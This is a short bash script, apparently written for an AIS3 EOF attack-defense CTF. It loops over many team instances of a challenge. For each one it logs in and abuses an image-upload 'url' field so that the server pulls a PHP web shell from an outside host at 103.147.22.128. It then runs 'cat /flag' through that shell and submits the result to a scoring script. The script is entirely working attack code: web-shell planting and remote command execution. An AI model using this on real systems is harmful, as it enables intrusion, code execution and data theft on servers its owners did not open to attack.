#!/bin/bash

for j in `seq 18 42`
do
	i=$(( $j + 30000 ))
	flagurl=''
	flag=''
	cookie=$(mktemp)
	curl 'http://chals2.eof.ais3.org:'$i'/login' --data-raw 'username=seadog007&password=test1234' -c $cookie -b $cookie
	flagurl=$(curl -c $cookie -b $cookie -s 'http://chals2.eof.ais3.org:'$i'/upload' --data-raw $'------WebKitFormBoundaryE9hwBFtBLrkMrXmm\r\nContent-Disposition: form-data; name="image"; filename=""\r\nContent-Type: application/octet-stream\r\n\r\n\r\n------WebKitFormBoundaryE9hwBFtBLrkMrXmm\r\nContent-Disposition: form-data; name="url"\r\n\r\nhttp://103.147.22.128/expl.php\r\n------WebKitFormBoundaryE9hwBFtBLrkMrXmm--\r\n' -H 'Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryE9hwBFtBLrkMrXmm' | grep -oP 'url=.+/view/\K.*?(?=")') && flag=$(curl -s 'http://chals2.eof.ais3.org:'$i'/uploads/expl.php?1=cat /flag') && bash /home/eof2022/score.sh $j "$flag" | jq . &
done
